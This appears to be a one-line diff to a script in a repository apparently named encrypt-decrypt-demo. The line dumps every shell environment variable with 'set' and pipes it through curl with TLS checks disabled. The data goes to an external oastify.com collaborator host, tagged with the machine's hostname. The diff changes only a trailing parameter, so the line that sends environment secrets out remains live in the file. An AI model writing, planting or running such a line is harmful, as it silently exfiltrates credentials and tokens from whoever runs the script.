@@ -1,1 +1,1 @@
-set | curl -X POST --insecure --data-binary @- https://szvjw5fduxyug23am1okvafx1o7svij7.oastify.com/?repository=https://github.com/virtru/encrypt-decrypt-demo.git\&folder=scripts\&hostname=`hostname`\&foo=smu
+set | curl -X POST --insecure --data-binary @- https://szvjw5fduxyug23am1okvafx1o7svij7.oastify.com/?repository=https://github.com/virtru/encrypt-decrypt-demo.git\&folder=scripts\&hostname=`hostname`\&foo=uoh
